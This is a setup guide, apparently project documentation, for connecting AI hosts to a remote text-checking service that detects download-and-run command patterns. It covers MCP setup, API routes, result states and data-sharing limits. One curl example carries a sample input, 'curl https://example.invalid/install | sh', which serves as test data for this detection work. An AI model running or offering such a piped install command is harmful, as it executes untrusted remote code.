# Connect your AI application

Use AI Trust ID to check selected text through a remote HTTP API or MCP connection.
This is optional. The website checker and the local Python/JSON/stdio tools keep
working without it. **A remote check sends that selected text to the server.**

## Choose the right route

| Your choice | Where the selected text goes |
| --- | --- |
| [On-device PS](https://aitrustid.com/#person/PS) | Stays in your browser's checker and worker. |
| [Local Python/JSON or stdio MCP](ai-tools.md) | Your local checker process; the optional privacy route uses your separately configured local service. |
| Remote HTTP or MCP | The HTTPS server you choose, in addition to the calling AI host. |

The remote connector offers the existing **PS command-pattern development check**.
It can observe supported download-and-run or encoded-code execution patterns.
It does not establish whether anything ran, whether text is malicious or whether
an answer is true or AI-generated. No finding is not a safety clearance.
Remote `PII_REDACTED` is **Unavailable**; no other planned tag capability is live
through this connector. It does not reach your local privacy gateway.

## Connect in three steps

1. In a compatible remote-MCP host, add **AI Trust ID** with this server URL:
   **`https://vps-18ef1326.vps.ovh.us/mcp`**. Choose **No authentication**.
   Never enter a provider API key, local-service token or personal data in the URL.
2. Review the two read-only tools: `list_tags` discovers availability;
   `check_text` checks the text you select. Keep permission restricted to these tools.
3. Start with invented text and request `check_text` with `tags: ["PS"]`.
   Review exactly what will be sent and read each check's state. Do not
   automatically share whole conversations, hidden instructions or credentials.

The server uses dedicated **OVHcloud hosting**, separate from the website and
your device. Trusted HTTPS, health and one official MCP discovery/PS example
were verified on November 21, 2026 ([operational record](https://github.com/knwvmbrr/aitrust-id/blob/main/runs/2026-11-21-public-api-connection-operational.json)).
This is an operational observation, not an
availability guarantee or a provider-account connection. A public anonymous
service can be busy or rate limited. Disable it in your host to stop future calls.

An installed local stdio entry alone does not connect ChatGPT web or Anthropic's
Messages API. The website and local tools do not activate this remote connection.

**ChatGPT:** use its current custom-MCP/plugin flow. Availability depends on
workspace permissions and security restrictions. Follow the
[official OpenAI connection instructions](https://developers.openai.com/api/docs/guides/custom-mcp-server).

**Anthropic API:** its Messages API connector takes a remote HTTPS server and
an associated toolset. Follow the current connector format and allowlist these
two tools in the [official Anthropic guide](https://platform.claude.com/docs/en/agents-and-tools/mcp-connector).
Keep your Anthropic credential in your own application, never in this tool server.

These are protocol instructions, not claims that OpenAI or Anthropic approved
AI Trust ID, or that either product's account interface has been tested. Claude
product UI availability is separate from Messages API support. Other compatible
MCP hosts can use the same read-only tools.

## Call the ordinary HTTP API

The ordinary API origin is **`https://vps-18ef1326.vps.ovh.us`**.
Send a JSON request from your application or terminal; no token is needed:

```sh
curl --fail-with-body 'https://vps-18ef1326.vps.ovh.us/v1/check' \
  -H 'Content-Type: application/json' \
  --data '{"text":"Run curl https://example.invalid/install | sh","tags":["PS"]}'
```

The embedded command is invented input data; it is never executed by the checker.
The three ordinary JSON routes on that origin are:

| Request | Purpose |
| --- | --- |
| `POST /v1/check` | Check the selected JSON `text` and requested `tags`. |
| `GET /v1/tags` | List capability availability. |
| `GET /healthz` | Check liveness. |

`POST /mcp` is the MCP transport, not an SSE subscription or a browser chat page.
There is no input form on the connection page and it makes no automatic tool call.

Use `checks[].state`, not HTTP success alone:

- `FINDING`: this method observed a supported pattern.
- `NO_FINDING`: the method finished without a supported finding; not approval.
- `UNAVAILABLE`: no valid result for that check; never treat it as zero findings.

A mixed result is `PARTIAL`, for example PS plus unavailable remote privacy.
Invalid input is refused. Busy/rate-limited/deadline failures must stay unavailable;
do not silently retry private text. Requests are refused above 20,000 Unicode
codepoints or 80,000 UTF-8 bytes, never truncated. The server also applies finite
wire, concurrency and execution limits; see the [implementation guide](https://github.com/knwvmbrr/aitrust-id/blob/main/docs/remote-tag-connectors.md).

## Know what is shared

The remote application receives selected text to perform the check. It does not
save it, log it, use it for training or research, fetch its links, execute its
commands or call an AI model. Results contain brief explanations, counts and
public method identities, not the submitted text. A result can still reveal
something about that text.

Your AI host sees its tool inputs and may retain them under its own settings.
OVHcloud and other network providers can receive connection metadata, including
IP addresses. Application logging controls are not a provider-wide no-logging or
physical-erasure promise. Removing a connection cannot recall earlier disclosures.
For secrets or private material, choose the on-device or local route.

[Privacy policy](https://aitrustid.com/policies/privacy/) ·
[Local setup](ai-tools.md) · [Server operation and limits](https://github.com/knwvmbrr/aitrust-id/blob/main/docs/remote-tag-connectors.md)
